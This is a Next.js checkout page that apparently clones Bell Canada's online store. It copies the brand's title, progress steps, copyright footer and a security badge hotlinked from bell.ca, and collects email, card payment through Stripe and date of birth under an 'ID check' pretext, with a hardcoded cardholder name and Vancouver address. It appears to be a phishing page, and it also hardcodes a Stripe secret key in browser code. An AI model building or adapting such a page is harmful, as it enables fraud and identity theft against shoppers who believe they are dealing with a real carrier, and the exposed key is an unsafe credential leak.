// pages/checkout.js
import { useState, useEffect } from 'react';
import Head from 'next/head';
import Link from 'next/link';
import { useRouter } from 'next/router';

export default function Checkout() {
  const router = useRouter();
  const [isLoading, setIsLoading] = useState(false);
  const [email, setEmail] = useState('');
  const [cardBrand, setCardBrand] = useState('');
  const [dob, setDob] = useState('');
  const [errorMessage, setErrorMessage] = useState('');
  const [stripeInitialized, setStripeInitialized] = useState(false);
  const [stripe, setStripe] = useState(null);
  const [elements, setElements] = useState(null);

  useEffect(() => {
    // Load Stripe.js script
    const stripeScript = document.createElement('script');
    stripeScript.src = 'https://js.stripe.com/v3/';
    stripeScript.async = true;
    
    stripeScript.onload = async () => {
      // Initialize Stripe
      try {
        const stripeInstance = window.Stripe('sk_test_51PvkPrHIlfdz3m5tj7nZkjAUsvZtJWhpuv2V1w207BEzqaQkiTlDkGntR54QXJavTwKTeX0yQYLGGRl3Y0QtfgxQ00LTpTatV9'); // Replace with your key
        setStripe(stripeInstance);
        
        // Create a payment intent
        const response = await fetch('/api/create-payment-intent', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
        });
        
        if (!response.ok) {
          throw new Error('Failed to create payment intent');
        }
        
        const { clientSecret } = await response.json();
        
        // Create Elements instance
        const elementsInstance = stripeInstance.elements({
          clientSecret,
          appearance: {
            theme: 'stripe',
            variables: {
              colorPrimary: '#00549a',
              colorBackground: '#ffffff',
              colorText: '#333333',
              colorDanger: '#e53935',
            },
            rules: {
              '.Input': {
                borderColor: '#ddd'
              },
              '.Input:focus': {
                borderColor: '#00549a'
              }
            }
          }
        });
        
        // Create and mount Link Authentication Element
        const linkAuthenticationElement = elementsInstance.create('linkAuthentication', {
          defaultValues: { email }
        });
        linkAuthenticationElement.mount('#link-authentication-element');
        
        // Create and mount Payment Element
        const paymentElement = elementsInstance.create('payment', {
          fields: {
            billingDetails: { 
              email: 'never',
              name: 'never'
            }
          }
        });
        paymentElement.mount('#payment-element');
        
        // Listen for changes in the Payment Element
        paymentElement.on('change', (event) => {
          if (event.value && event.value.type === 'card' && event.value.card && event.value.card.brand) {
            setCardBrand(event.value.card.brand);
          } else {
            setCardBrand('');
          }
          
          // Clear error message when user makes changes
          if (errorMessage) {
            setErrorMessage('');
          }
        });
        
        setElements(elementsInstance);
        setStripeInitialized(true);
      } catch (error) {
        console.error('Error initializing Stripe:', error);
        setErrorMessage('Failed to load payment system. Please refresh the page or try again later.');
      }
    };
    
    stripeScript.onerror = () => {
      console.error('Failed to load Stripe.js');
      setErrorMessage('Failed to load payment system. Please refresh the page or try again later.');
    };
    
    document.body.appendChild(stripeScript);
    
    return () => {
      // Cleanup if component unmounts
      if (document.body.contains(stripeScript)) {
        document.body.removeChild(stripeScript);
      }
    };
  }, [email, errorMessage]);

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    if (!stripe || !elements) {
      // Stripe has not loaded yet
      return;
    }
    
    setIsLoading(true);
    
    // Validate form fields
    if (!email) {
      setErrorMessage('Please enter your email address.');
      setIsLoading(false);
      return;
    }
    
    if (!dob) {
      setErrorMessage('Please enter your date of birth.');
      setIsLoading(false);
      return;
    }
    
    try {
      const { error } = await stripe.confirmPayment({
        elements,
        confirmParams: {
          return_url: `${window.location.origin}/success`,
          receipt_email: email,
          payment_method_data: {
            billing_details: {
              name: 'Jason Bourne',
              email: email,
              address: {
                city: 'Vancouver',
                country: 'CA',
                line1: '220-885 Georgia St',
                postal_code: 'V6C 3E8',
                state: 'BC'
              }
            }
          }
        }
      });
      
      if (error) {
        if (error.type === 'card_error' || error.type === 'validation_error') {
          setErrorMessage(error.message || 'An error occurred with your payment information.');
        } else {
          setErrorMessage('An unexpected error occurred during payment processing.');
        }
      }
    } catch (error) {
      console.error('Payment error:', error);
      setErrorMessage('An error occurred while processing your payment.');
    }
    
    setIsLoading(false);
  };
  
  const handleEmailChange = (e) => {
    setEmail(e.target.value);
  };
  
  const handleDobChange = (e) => {
    setDob(e.target.value);
  };

  return (
    <>
      <Head>
        <title>Setup &amp; verification | Checkout | Bell Canada</title>
        <meta name="description" content="Bell Canada checkout page" />
      </Head>

      <header className="header">
        <div className="container">
          <div className="header-content">
            <Link href="/" className="logo">Bell</Link>
            <div>
              <Link href="/cart" style={{color: 'white', textDecoration: 'none'}}>
                <span style={{marginRight: '8px'}}>Back to cart</span>
              </Link>
            </div>
          </div>
        </div>
      </header>

      <div className="progress-steps">
        <div className="container">
          <div className="steps">
            <div className="step complete">
              <div className="step-number">✓</div>
              <div className="step-label">Customer information</div>
            </div>
            <div className="step complete">
              <div className="step-number">✓</div>
              <div className="step-label">Number setup</div>
            </div>
            <div className="step complete">
              <div className="step-number">✓</div>
              <div className="step-label">Shipping</div>
            </div>
            <div className="step active">
              <div className="step-number">4</div>
              <div className="step-label">ID check</div>
            </div>
            <div className="step">
              <div className="step-number">5</div>
              <div className="step-label">Review & place order</div>
            </div>
          </div>
          
          <div className="mobile-steps">
            <span>4/5 - ID check</span>
          </div>
        </div>
      </div>

      <div className="container">
        <div className="checkout-container">
          <div className="checkout-form">
            <h2>ID check</h2>
            <p>This information is required for online purchases and is used to verify and protect your identity. We keep this information safe and will not use it for any other purpose.</p>
            <p>To protect our customers, devices purchased fraudulently from Bell will be disabled.</p>
            <p>* Required fields</p>
            
            <div className="form-section">
              <div style={{display: 'flex', justifyContent: 'space-between', alignItems: 'center'}}>
                <h3>Billing address</h3>
                <a href="#" style={{color: 'var(--bell-blue)', textDecoration: 'none'}}>Edit</a>
              </div>
              <p>220-885 Georgia St, <br/>Vancouver, BC, V6C 3E8</p>
            </div>
            
            <div className="form-section">
              <div style={{display: 'flex', justifyContent: 'space-between', alignItems: 'center'}}>
                <h3>Cardholder name</h3>
                <a href="#" style={{color: 'var(--bell-blue)', textDecoration: 'none'}}>Edit</a>
              </div>
              <p>Jason Bourne</p>
            </div>

            <form onSubmit={handleSubmit} id="payment-form">
              <div className="form-group">
                <label htmlFor="email" className="form-label">
                  <span>*</span> Email address
                </label>
                <input 
                  id="email"
                  type="email"
                  value={email}
                  onChange={handleEmailChange}
                  className="form-control"
                  placeholder="email@example.com"
                  required
                />
                <p className="small-text">
                  We'll send your receipt to this email
                </p>
              </div>
              
              <div id="link-authentication-element" className="form-group">
                {/* Stripe Link will mount here */}
              </div>

              <div className="form-group">
                <label htmlFor="payment-element" className="form-label">
                  <span>*</span> Payment information
                </label>
                <div id="payment-element" className="card-details">
                  {/* Stripe Payment Element will mount here */}
                </div>
                
                {cardBrand && (
                  <div 
                    id="card-brand-display" 
                    style={{display: 'flex', marginTop: '10px'}}
                  >
                    {cardBrand.toUpperCase()} card detected
                  </div>
                )}
              </div>

              <div className="form-group">
                <label htmlFor="dob" className="form-label">
                  <span>*</span> Date of Birth
                </label>
                <input 
                  id="dob"
                  type="text" 
                  className="form-control" 
                  placeholder="MM/DD/YYYY"
                  value={dob}
                  onChange={handleDobChange}
                  required
                />
              </div>
              
              {errorMessage && (
                <div className="error">
                  {errorMessage}
                </div>
              )}
              
              <button 
                type="submit"
                className="btn" 
                disabled={isLoading || !stripeInitialized}
              >
                {isLoading ? (
                  <>
                    <span className="spinner" aria-hidden="true"></span>
                    <span>Processing...</span>
                  </>
                ) : (
                  <span>Next: Review</span>
                )}
              </button>
            </form>
            
            {/* Debug indicator in development mode */}
            {process.env.NODE_ENV === 'development' && (
              <div style={{
                marginTop: '20px',
                padding: '10px',
                backgroundColor: stripeInitialized ? '#e8f5e9' : '#ffebee',
                borderRadius: '4px',
                fontSize: '14px'
              }}>
                Status: {stripeInitialized ? 'Payment system loaded ✅' : 'Loading payment system...'}
              </div>
            )}
          </div>
          
          <div className="order-summary">
            <h3>Summary</h3>
            
            <div className="summary-row">
              <div className="summary-label">Due monthly</div>
              <div className="summary-price">$95.21</div>
            </div>
            
            <div style={{marginTop: '10px', color: '#666', fontSize: '14px'}}>after taxes</div>
            
            <div className="summary-row" style={{marginTop: '20px'}}>
              <div className="summary-label">Due today</div>
              <div className="summary-price">$0.00</div>
            </div>
            
            <div style={{marginTop: '10px', color: '#666', fontSize: '14px'}}>after taxes & shipping</div>
            
            <div style={{marginTop: '30px', backgroundColor: '#f4f4f4', padding: '20px', borderRadius: '8px'}}>
              <h4 style={{marginTop: '0'}}>Your purchase includes:</h4>
              
              <div style={{display: 'flex', marginBottom: '15px'}}>
                <div style={{width: '30px', color: 'var(--bell-blue)', fontSize: '24px', textAlign: 'center'}}>
                  <span>📊</span>
                </div>
                <div style={{marginLeft: '10px', flex: '1'}}>
                  <p style={{margin: '0', fontSize: '14px'}}>Exclusive online savings - Bonus savings of $70 if you place your online order today<sup>†</sup></p>
                </div>
              </div>
              
              <div style={{display: 'flex', marginBottom: '15px'}}>
                <div style={{width: '30px', color: 'var(--bell-blue)', fontSize: '24px', textAlign: 'center'}}>
                  <span>🚚</span>
                </div>
                <div style={{marginLeft: '10px', flex: '1'}}>
                  <p style={{margin: '0', fontSize: '14px'}}>Fast shipping</p>
                </div>
              </div>
              
              <div style={{display: 'flex', marginBottom: '15px'}}>
                <div style={{width: '30px', color: 'var(--bell-blue)', fontSize: '24px', textAlign: 'center'}}>
                  <span>↩️</span>
                </div>
                <div style={{marginLeft: '10px', flex: '1'}}>
                  <p style={{margin: '0', fontSize: '14px'}}>Hassle-free returns</p>
                </div>
              </div>
              
              <div style={{textAlign: 'center', marginTop: '20px'}}>
                <a href="#" style={{color: 'var(--bell-blue)', textDecoration: 'none'}}>Learn more</a>
              </div>
            </div>
          </div>
        </div>
      </div>

      <footer style={{
        marginTop: '50px',
        padding: '30px 0',
        backgroundColor: '#f4f4f4',
        borderTop: '1px solid #ddd'
      }}>
        <div className="container">
          <div style={{
            display: 'flex',
            flexWrap: 'wrap',
            justifyContent: 'space-between'
          }}>
            <div>
              <p style={{fontSize: '14px', color: '#666'}}>
                © Bell Canada, 2023. All rights reserved.
              </p>
              <ul style={{
                display: 'flex',
                listStyle: 'none',
                padding: 0,
                margin: '10px 0 0'
              }}>
                <li style={{marginRight: '20px'}}>
                  <a href="#" style={{color: 'var(--bell-blue)', fontSize: '14px'}}>Privacy</a>
                </li>
                <li style={{marginRight: '20px'}}>
                  <a href="#" style={{color: 'var(--bell-blue)', fontSize: '14px'}}>Security</a>
                </li>
                <li>
                  <a href="#" style={{color: 'var(--bell-blue)', fontSize: '14px'}}>Legal & regulatory</a>
                </li>
              </ul>
            </div>
            <div>
              <img 
                src="https://www.bell.ca/styles/solutionBuilder/img/entrust.png" 
                alt="Secured by Entrust SSL" 
                style={{maxWidth: '120px', height: 'auto'}}
              />
            </div>
          </div>
        </div>
      </footer>
    </>
  );
}
